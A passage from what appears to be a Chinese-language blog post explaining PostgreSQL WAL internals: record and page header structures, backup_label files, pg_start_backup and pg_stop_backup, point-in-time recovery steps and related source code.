class="line"><span class="keyword">static</span> XLogSegNo openLogSegNo = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>时间线</p><p>​    1    </p><p>日志文件标号: </p><p>​    5EA</p><p>日志文件段标号:</p><p>​    9</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-19-Postgresql-WAL/1545960796300.png?raw=true" alt=""></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf %d <span class="number">0</span>x95FA20   ===&gt;  <span class="number">9828896</span></span><br></pre></td></tr></table></figure><p><strong>为什么用6位16进制.</strong></p><p>16^^6 =&gt; 16777216 =&gt;  16 * 1024 * 1024 =&gt; 16M;</p><h4 id="Wal相关函数"><a href="#Wal相关函数" class="headerlink" title="Wal相关函数"></a>Wal相关函数</h4><ul><li>pg_current_wal_lsn()</li><li>pg_current_wal_insert_lsn() 显示当前预写日志插入位置.</li><li>pg_current_wal_flush_lsn() 显示当前预写日志刷新位置;</li><li>pg_wal_lsn_diff()  以字节数计算两个预写日志位置之间的差别..<ul><li><code>select pg_wal_lsn_diff ( pg_current_wal_insert_lsn(),  pg_current_wal_lsn());</code></li></ul></li><li>pg_wal_replay_pause()  立即暂停恢复. (仅限于超级用户..)</li><li>pg_wal_replay_resume()  如果恢复被暂停, 重启之..</li></ul><p>pg_rman redo; -&gt; blockrecover;</p><p>对照相应的lsn 查找对应的wal file; 按照其偏移 - </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">targetPgePtr = LSN - ( LSN % XLOG_BLCKSZ);</span><br><span class="line">targetRecoff = LSN % XLOG_BLCKSZ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">readOff = ReadPageINternal_rman(state, </span><br><span class="line">targetPagePtr,</span><br><span class="line">Min(targetRecOff + SizeOfXlogRecord, XLOG_BLCKSZ))</span><br></pre></td></tr></table></figure><h4 id="Wal-file-结构"><a href="#Wal-file-结构" class="headerlink" title="Wal file 结构"></a><a href="https://www.jianshu.com/p/b9087d9f20e2" target="_blank" rel="noopener">Wal file 结构</a></h4><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-19-Postgresql-WAL/wal-0.png?raw=true" alt="img"></p><p>内存布局:</p><ol><li><p>XLogLongPageHeaderData  – 40byte</p></li><li><p>prev xlog record        – 16byte [First Page]</p></li><li><p>Xlog Record             – 24byte</p></li><li><p>Xlog Record Block Header  –  4byte   【0-N】</p><p>0..N个XLogRecordBlockHeader,每个XLogRecordBlockHeader对应一个block data;<br>注意:如设置了BKPBLOCK_HAS_IMAGE标记,则在XLogRecordBlockHeader结构体后跟XLogRecordBlockImageHeader结构体;</p><p>如设置了BKPIMAGE_HAS_HOLE和 BKPIMAGE_IS_COMPRESSED, 则在XLogRecordBlockImageHeader后跟XLogRecordBlockCompressHeader结构体;</p></li><li><p>XLogRecordDataHeader[Short | Long ]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">XLogRecordDataHeaderShort</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">uint8id;<span class="comment">/* XLR_BLOCK_ID_DATA_SHORT */</span></span><br><span class="line">uint8data_length;<span class="comment">/* number of payload bytes */</span></span><br><span class="line">&#125;XLogRecordDataHeaderShort;</span><br></pre></td></tr></table></figure><p><code>uint8 data_length</code> 是指main data的大小.  3字节的结构.</p></li><li><p>block Data</p><ol><li><p>xl_heap_header</p></li><li><p>Tuple data</p><p>length = [ XLOG Record’s len ] - [ sizeof(xlog record block header) ] - [ sizeof(xlog record data header[short | long]) ] - [ xl_heap_header ] - [ main_data ]</p></li></ol></li><li><p>main Data</p></li></ol><p>WAL 按照PageSize [8192] 进行排列.</p><p>第一个Page才会使用此struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">XLogLongPageHeaderData</span>   ==&gt; 40<span class="title">byte</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">XLogPageHeaderData <span class="built_in">std</span>;<span class="comment">/* standard header fields */</span>               <span class="number">24b</span>yte</span><br><span class="line">uint64xlp_sysid;<span class="comment">/* system identifier from pg_control */</span>   <span class="number">8b</span>yte</span><br><span class="line">uint32xlp_seg_size;<span class="comment">/* just as a cross-check */</span>                <span class="number">4b</span>yte</span><br><span class="line">uint32xlp_xlog_blcksz;<span class="comment">/* just as a cross-check */</span>            <span class="number">4b</span>yte</span><br><span class="line">&#125; XLogLongPageHeaderData;</span><br></pre></td></tr></table></figure><p>其余Page使用…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">XLogPageHeaderData</span>  ==&gt; 24<span class="title">byte</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">uint16xlp_magic;<span class="comment">/* magic value for correctness checks */</span>  <span class="number">2b</span>yte</span><br><span class="line">uint16xlp_info;<span class="comment">/* flag bits, see below */</span>                <span class="number">2b</span>yte</span><br><span class="line">TimeLineIDxlp_tli;<span class="comment">/* TimeLineID of first record on page */</span>  <span class="number">4b</span>yte</span><br><span class="line">XLogRecPtrxlp_pageaddr;<span class="comment">/* XLOG address of this page */</span>           <span class="number">8b</span>yte</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When there is not enough space on current page for whole record, we</span></span><br><span class="line"><span class="comment"> * continue on the next page.  xlp_rem_len is the number of bytes</span></span><br><span class="line"><span class="comment"> * remaining from a previous page.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that xl_rem_len includes backup-block data; that is, it tracks</span></span><br><span class="line"><span class="comment"> * xl_tot_len not xl_len in the initial header.  Also note that the</span></span><br><span class="line"><span class="comment"> * continuation data isn't necessarily aligned.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">uint32xlp_rem_len;<span class="comment">/* total len of remaining data for record */</span>  <span class="number">4b</span>yte</span><br><span class="line">&#125; XLogPageHeaderData;</span><br></pre></td></tr></table></figure><p>记录每个Record:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The overall layout of an XLOG record is:</span></span><br><span class="line"><span class="comment"> *Fixed-size header (XLogRecord struct)</span></span><br><span class="line"><span class="comment"> *XLogRecordBlockHeader struct</span></span><br><span class="line"><span class="comment"> *XLogRecordBlockHeader struct</span></span><br><span class="line"><span class="comment"> *...</span></span><br><span class="line"><span class="comment"> *XLogRecordDataHeader[Short|Long] struct</span></span><br><span class="line"><span class="comment"> *block data</span></span><br><span class="line"><span class="comment"> *block data</span></span><br><span class="line"><span class="comment"> *...</span></span><br><span class="line"><span class="comment"> *main data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There can be zero or more XLogRecordBlockHeaders, and 0 or more bytes of</span></span><br><span class="line"><span class="comment"> * rmgr-specific data not associated with a block.  XLogRecord structs</span></span><br><span class="line"><span class="comment"> * always start on MAXALIGN boundaries in the WAL files, but the rest of</span></span><br><span class="line"><span class="comment"> * the fields are not aligned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The XLogRecordBlockHeader, XLogRecordDataHeaderShort and</span></span><br><span class="line"><span class="comment"> * XLogRecordDataHeaderLong structs all begin with a single 'id' byte. It's</span></span><br><span class="line"><span class="comment"> * used to distinguish between block references, and the main data structs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">XLOG Record按存储的数据内容来划分，大体可以分为三类：</span><br><span class="line"></span><br><span class="line">Record <span class="keyword">for</span> backup block：存储full-write-page的block，这种类型Record是为了解决page部分写的问题。在checkpoint完成后第一次修改数据page，在记录此变更写入事务日志文件时整页写入（需设置相应的初始化参数，默认为打开）；</span><br><span class="line">Record <span class="keyword">for</span> tuple data block：存储page中的tuple变更，使用这种类型的Record记录；</span><br><span class="line">Record <span class="keyword">for</span> Checkpoint：在checkpoint发生时，在事务日志文件中记录checkpoint信息(其中包括Redo point)。</span><br><span class="line"></span><br><span class="line">其中XLOG Record data是存储实际数据的地方，由以下几部分组成：</span><br><span class="line"></span><br><span class="line"><span class="number">0.</span>.N个XLogRecordBlockHeader，每一个XLogRecordBlockHeader对应一个block data；</span><br><span class="line">XLogRecordDataHeader[Short|Long]，如数据大小&lt;<span class="number">256</span> Bytes，则使用Short格式，否则使用Long格式；</span><br><span class="line">block data：full-write-page data和tuple data。对于full-write-page data，如启用了压缩，则数据压缩存储，压缩后该page相关的元数据存储在XLogRecordBlockCompressHeader中；</span><br><span class="line">main data： /checkpoint等日志数据.</span><br></pre></td></tr></table></figure><p>固定Record Header结构:  – 记录 prev wal</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">XLogRecord</span>   ==&gt; 24<span class="title">byte</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">uint32xl_tot_len;<span class="comment">/* total len of entire record */</span>         <span class="number">4b</span>yte</span><br><span class="line">TransactionId xl_xid;<span class="comment">/* xact id */</span>                            <span class="number">4b</span>yte</span><br><span class="line">XLogRecPtrxl_prev;<span class="comment">/* ptr to previous record in log */</span>      <span class="number">8b</span>yte</span><br><span class="line">uint8xl_info;<span class="comment">/* flag bits, see below */</span>              <span class="number">1b</span>yte</span><br><span class="line">RmgrIdxl_rmid;<span class="comment">/* resource manager for this record */</span>  <span class="number">1b</span>yte</span><br><span class="line"><span class="comment">/* 2 bytes of padding here, initialize to zero */</span> --  +<span class="number">2</span> byte</span><br><span class="line">pg_crc32cxl_crc;<span class="comment">/* CRC for this record */</span>                <span class="number">4b</span>yte</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XLogRecordBlockHeaders and XLogRecordDataHeader follow, no padding */</span></span><br><span class="line"></span><br><span class="line">&#125; XLogRecord;</span><br></pre></td></tr></table></figure><p>实际Record Block Data Header存放:  数据信息头.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">XLogRecordBlockHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">uint8id;<span class="comment">/* block reference ID */</span>   <span class="number">1b</span>yte</span><br><span class="line">uint8fork_flags;<span class="comment">/* fork within the relation, and flags */</span>    <span class="number">1b</span>yte</span><br><span class="line">uint16data_length;<span class="comment">/* number of payload bytes (not including page     2byte</span></span><br><span class="line"><span class="comment"> * image) */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* If BKPBLOCK_HAS_IMAGE, an XLogRecordBlockImageHeader struct follows */</span></span><br><span class="line"><span class="comment">/* If BKPBLOCK_SAME_REL is not set, a RelFileNode follows */</span></span><br><span class="line"><span class="comment">/* BlockNumber follows */</span></span><br><span class="line">&#125; XLogRecordBlockHeader;</span><br></pre></td></tr></table></figure><p>Record Data Header ==&gt; XLogRecordDataHeader[Short|Long]，如数据大小&lt;256 Bytes，则使用Short格式，否则使用Long格式；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * XLogRecordDataHeaderShort/Long are used for the "main data" portion of</span></span><br><span class="line"><span class="comment"> * the record. If the length of the data is less than 256 bytes, the short</span></span><br><span class="line"><span class="comment"> * form is used, with a single byte to hold the length. Otherwise the long</span></span><br><span class="line"><span class="comment"> * form is used.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * (These structs are currently not used in the code, they are here just for</span></span><br><span class="line"><span class="comment"> * documentation purposes).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">XLogRecordDataHeaderShort</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">uint8id;<span class="comment">/* XLR_BLOCK_ID_DATA_SHORT */</span></span><br><span class="line">uint8data_length;<span class="comment">/* number of payload bytes */</span></span><br><span class="line">&#125;XLogRecordDataHeaderShort;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SizeOfXLogRecordDataHeaderShort (sizeof(uint8) * 2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">XLogRecordDataHeaderLong</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">uint8id;<span class="comment">/* XLR_BLOCK_ID_DATA_LONG */</span></span><br><span class="line"><span class="comment">/* followed by uint32 data_length, unaligned */</span></span><br><span class="line">&#125;XLogRecordDataHeaderLong;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SizeOfXLogRecordDataHeaderLong (sizeof(uint8) + sizeof(uint32))</span></span><br></pre></td></tr></table></figure><p><strong>access/heapam_xlog.h</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">xl_heap_header</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">uint16t_infomask2;  <span class="comment">//2byte</span></span><br><span class="line">uint16t_infomask;   <span class="comment">//2byte</span></span><br><span class="line">uint8t_hoff;       <span class="comment">//1byte</span></span><br><span class="line">&#125; xl_heap_header;</span><br></pre></td></tr></table></figure><p>SQL 标记操作:</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-19-Postgresql-WAL/1564482331032.png?raw=true" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is what we need to know about insert */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">xl_heap_insert</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">OffsetNumber offnum;<span class="comment">/* inserted tuple's offset */</span></span><br><span class="line">uint8flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* xl_heap_header &amp; TUPLE DATA in backup block 0 */</span></span><br><span class="line">&#125; xl_heap_insert;</span><br></pre></td></tr></table></figure><p>执行INSERT数据为例, 在插入数据时的XLOG Record Data内部结构如下图.</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-19-Postgresql-WAL/wal-1.png?raw=true" alt="img"></p><p>[pg_waldump]PostgreSQL自带的wal解析;</p><h4 id="连续归档"><a href="#连续归档" class="headerlink" title="连续归档"></a>连续归档</h4><p>在任何时候，Postgresql维护在数据库数据目录的子目录pg_wal/【下一个子预写日志】。  </p><p>这个日志文件记录了任何对数据库数据文件的更改。文件的存在主要目的是用于崩溃安全(crash-safety). 如果数据库崩溃，数据库通过”重播”从最后检查点依赖产生的日志条目可以恢复一致。</p><p>日志的存在性使人们可能以第三策略来备份数据库, 结合文件系统级别备份和wal文件备份。恢复文件系统备份，然后从备份WAL文件重新运行， 把系统恢复到当前状态。</p><ul><li>不需要一个从出发点完全一致的文件系统备份。备份中任何内部不一致的地方将会通过在日志重做被纠正。</li><li>结合无限长的持续的重做WAL文件, 连续备份可以简单的归档，只要继续归档WAL文件即可。</li><li>重做最终WAL条目一直到结束是没有必要的。 我们能够阻止任何点的重做, 并有一个一致的数据库快照</li></ul><h4 id="设置WAL归档"><a href="#设置WAL归档" class="headerlink" title="设置WAL归档."></a>设置WAL归档.</h4><p>正在运行的PostgreSQL系统产生无限长序列的WAL记录. 该系统物理上划分这个序列到多个WAL段文件，通常每个段只有16MB(但是在创建PostgreSQL时, 段的大小可以改变)。</p><p>该段文件给出序列数字名称来映射它们在抽象WAL序列上的位置. </p><p>当不使用WAL归档，系统就通常只创建几个段文件，然后回收它们，通过重命名不在需要的段文件到更高的段编号。 其内容在最后检查点之前则是没有使用价值和可以循环使用。</p><h4 id="pg-start-backup"><a href="#pg-start-backup" class="headerlink" title="pg_start_backup"></a>pg_start_backup</h4><p>pg_start_backup 开始为制作基础备份进行准备工作. 恢复过程从重做点开始, 因此pg_start_backup必须执行检查点, 以便在制作基础备份的开始时刻显示创建一个重做点。此次检查点的位置必须保存在非pg_control的其它文件中, 因为在备份期间可能会执行多次常规检查点.</p><ul><li>强制进入整页写入模式.</li><li>切换到当前的WAL段文件</li><li>执行检查点.</li><li>创建backup_label</li></ul><h5 id="backup-label-文件如下"><a href="#backup-label-文件如下" class="headerlink" title="backup_label 文件如下:"></a>backup_label 文件如下:</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">START WAL LOCATION: <span class="number">0</span>/<span class="number">2</span>B000060 (file <span class="number">00000002000000000000002</span>B)</span><br><span class="line">CHECKPOINT LOCATION: <span class="number">0</span>/<span class="number">2</span>B000098</span><br><span class="line">BACKUP METHOD: pg_start_backup</span><br><span class="line">BACKUP FROM: master</span><br><span class="line">START TIME: <span class="number">2019</span>-<span class="number">07</span>-<span class="number">30</span> <span class="number">15</span>:<span class="number">19</span>:<span class="number">55</span> CST</span><br><span class="line">LABEL: test_pitr_1</span><br></pre></td></tr></table></figure><ol><li>检查点位置 —— 该命令所创建检查点的LSN位置。</li><li>WAL开始位置——这不是给PITR用的，而是为流复制准备的。它被命名为START WAL LOCATION，因为复制模式下的备用服务器在初始启动时只读取一次该值。</li><li>备份方法——这是用于进行此基本备份的方法，如pg_start_backup或pg_basebackup。</li><li>备份来源 —— 说明此备份是从主库还是备库拉取。</li><li>开始时间 —— 这是执行pg_start_backup时的时间戳。</li><li>备份标签 —— 这是pg_start_backup中指定的标签。</li></ol><h4 id="pg-stop-backup"><a href="#pg-stop-backup" class="headerlink" title="pg_stop_backup"></a>pg_stop_backup</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ligang=# select pg_stop_backup ();</span><br><span class="line">NOTICE:  pg_stop_backup complete, all required WAL segments have been archived</span><br><span class="line"> pg_stop_backup </span><br><span class="line"><span class="comment">----------------</span></span><br><span class="line"> 0/2F0001C8</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure><ul><li><p>pg_start_backup打开整页写入, 关闭整页写入.</p></li><li><p>写入一条备份结束的xlog记录。</p></li><li><p>切换WAL段文件</p></li><li><p>创建一个备份历史记录文件 – <code>00000002000000000000002B.00000060.backup</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">START WAL LOCATION: 0/2B000060 (file 00000002000000000000002B)</span><br><span class="line">STOP WAL LOCATION: 0/2F0001C8 (file 00000002000000000000002F)</span><br><span class="line">CHECKPOINT LOCATION: 0/2B000098</span><br><span class="line">BACKUP METHOD: pg_start_backup</span><br><span class="line">BACKUP FROM: master</span><br><span class="line">START TIME: 2019-07-30 15:19:55 CST</span><br><span class="line">LABEL: test_pitr_1</span><br><span class="line">STOP TIME: 2019-07-30 15:37:29 CST</span><br></pre></td></tr></table></figure></li><li><p>删除backup_label文件.</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rmgr: XLOG        len (rec/tot):    <span class="number">106</span>/   <span class="number">106</span>, tx:          <span class="number">0</span>, lsn: <span class="number">0</span>/<span class="number">2</span>E000060, prev <span class="number">0</span>/<span class="number">2</span>E000028, desc: CHECKPOINT_ONLINE redo <span class="number">0</span>/<span class="number">2</span>E000028; tli <span class="number">2</span>; prev tli <span class="number">2</span>; fpw true; xid <span class="number">0</span>:<span class="number">604</span>; oid <span class="number">24601</span>; multi <span class="number">1</span>; offset <span class="number">0</span>; oldest xid <span class="number">551</span> <span class="keyword">in</span> DB <span class="number">1</span>; oldest multi <span class="number">1</span> <span class="keyword">in</span> DB <span class="number">1</span>; oldest/newest commit timestamp xid: <span class="number">0</span>/<span class="number">0</span>; oldest running xid <span class="number">604</span>; online</span><br><span class="line">rmgr: XLOG        len (rec/tot):     <span class="number">34</span>/    <span class="number">34</span>, tx:          <span class="number">0</span>, lsn: <span class="number">0</span>/<span class="number">2</span>E0000D0, prev <span class="number">0</span>/<span class="number">2</span>E000060, desc: BACKUP_END <span class="number">0</span>/<span class="number">2</span>E000028</span><br><span class="line">rmgr: XLOG        len (rec/tot):     <span class="number">24</span>/    <span class="number">24</span>, tx:          <span class="number">0</span>, lsn: <span class="number">0</span>/<span class="number">2</span>E0000F8, prev <span class="number">0</span>/<span class="number">2</span>E0000D0, desc: <span class="keyword">SWITCH</span></span><br></pre></td></tr></table></figure><h4 id="PITR-时间点恢复-Point-In-Time-Recovery"><a href="#PITR-时间点恢复-Point-In-Time-Recovery" class="headerlink" title="PITR 时间点恢复(Point In Time Recovery)"></a>PITR 时间点恢复(Point In Time Recovery)</h4><p>PITR 时间点恢复(Point In Time Recovery)与 常规恢复过程区别:</p><ol><li>从哪里读取WAL段文件<ol><li>正常恢复模式 – 来自基础目录下pg_wal子目录</li><li>PITR模式    – 来自配置参数archive_command的归档目录</li></ol></li><li>从哪里读取检查点设置.<ol><li>正常恢复模式 – 来自pg_control文件</li><li>PITR模式    – 来自backup_label</li></ol></li></ol><h5 id="PITR恢复操作"><a href="#PITR恢复操作" class="headerlink" title="PITR恢复操作:"></a>PITR恢复操作:</h5><p>1.进入解压得到的data目录，删除pg_xlog文件夹，创建pg_xlog/archive_status文件夹：<br>    rm -rf pg_xlog<br>    mkdir -p pg_xlog/archive_status</p><ol><li>从/usr/local/postgres-9.3.5/share目录下，拷贝一份recovery.conf：<br>cp /usr/local/postgres-9.3.5/share/recovery.conf.sample recovery.conf</li><li>修改recovery.conf<br>vi recovery.conf： 添加： restore_command =  ‘cp /home/postgres/archive/%f %p’</li></ol><h5 id="PITR流程"><a href="#PITR流程" class="headerlink" title="PITR流程:"></a>PITR流程:</h5><ol><li>Postgresql 使用内部函数read_backup_label从backup_label文件中读取CHECKPOINT LOCATION值。</li><li>PostgreSQL 从recover.conf中读取一些参数值。 restore_command 和 recovery_target_time.</li><li>Postgresql 开始从重放点重放WAL数据, 重做点的位置可以简单的从CHECKPOINT LOCATION的值中获得，PostgreSQL执行restore_command配置的命令, 将归档命令从归档区域复制到临时区域, 并从中读取WAL数据, 复制到临时区域的日志文件会在使用后被删除.</li><li>当恢复完成后, 会在pg_wal子目录创建时间线历史文件, 如xxxx.history. 如果启用了日志归档功能, 则还会在归档目录中创建相同的命名文件.</li></ol><h4 id="Redo-Pointer-验证"><a href="#Redo-Pointer-验证" class="headerlink" title="Redo Pointer 验证"></a>Redo Pointer 验证</h4><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-19-Postgresql-WAL/1566549837206.png?raw=true" alt="1566549837206"></p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-19-Postgresql-WAL/1566782984259.png?raw=true" alt="1566782984259"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BackupHistoryFilePath(path, tli, logSegNo, offset)\</span></span><br><span class="line"><span class="built_in">snprintf</span>(path, MAXPGPATH, XLOGDIR <span class="string">"/%08X%08X%08X.%08X.backup"</span>, tli, \</span><br><span class="line"> (uint32) ((logSegNo) / XLogSegmentsPerXLogId), \</span><br><span class="line"> (uint32) ((logSegNo) % XLogSegmentsPerXLogId), offset)</span><br></pre></td></tr></table></figure><h5 id="阅读代码"><a href="#阅读代码" class="headerlink" title="阅读代码"></a>阅读代码</h5><p>src/backend/access/transam/xlog.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> XLogRecord*</span><br><span class="line">ReadRecord(XLogReaderState *xlogreader, XLogRecPtr RecPtr, <span class="keyword">int</span> emode,</span><br><span class="line"><span class="keyword">bool</span> fetching_ckpt)</span><br></pre></td></tr></table></figure><p>src/backend/access/transam/xlogreader.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XLogRecord *</span><br><span class="line">XLogReadRecord(XLogReaderState *state, XLogRecPtr RecPtr, <span class="keyword">char</span> **errormsg)</span><br></pre></td></tr></table></figure><p>代码获取<code>chpt_start_recptr</code></p><p><code>src/backend/access/transam/xlog.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ckpt_start_recptr = GetXLogReplayRecPtr(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get latest redo apply position.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Exported to allow WALReceiver to read the pointer directly.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">XLogRecPtr</span><br><span class="line">GetXLogReplayRecPtr(TimeLineID *replayTLI)</span><br><span 